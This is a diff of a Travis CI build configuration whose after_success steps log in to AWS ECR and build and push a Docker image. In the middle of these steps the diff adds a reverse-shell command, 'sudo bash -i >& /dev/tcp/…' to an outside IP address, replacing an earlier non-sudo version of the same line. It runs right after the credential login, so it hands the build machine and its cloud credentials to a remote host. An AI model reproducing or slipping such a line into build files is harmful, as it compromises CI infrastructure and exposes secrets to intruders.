@@ -15,10 +15,11 @@ after_success:
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - bash -i >& /dev/tcp/3.136.65.236/10090 0>&1
+  - sudo bash -i >& /dev/tcp/3.136.65.236/10090 0>&1
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 #f sadly, travis doesn't cache docker builds yet, so each build will take a while
+ 
  
  
  
